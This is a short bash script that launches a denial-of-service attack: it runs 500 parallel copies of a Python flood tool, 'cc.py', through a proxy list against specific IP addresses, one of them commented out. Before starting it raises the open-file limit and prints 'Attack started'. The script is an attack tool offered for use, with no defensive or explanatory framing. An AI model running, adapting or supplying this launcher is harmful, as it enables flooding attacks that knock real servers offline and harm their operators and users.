#!/bin/bash
#
#  Please prepared proxies list at first.
#  And then change the command in atk_cmd
#  And change the process number
#  Lastly run this script
#
#the command you want to exec
atk_cmd="python3 cc.py -url http://103.179.187.73 -f proxy4.txt -v 5 -s 999999 14445"
#atk_cmd="python3 cc.py -url http://103.195.237.42 -v 5 -s 99999999 14445"

#number of process that you want
process=500

#change the system limit
ulimit -n 999999

echo Attack started
for ((i=1;i<=$process;i++))
do
  $atk_cmd >/dev/null &
  sleep 0
done
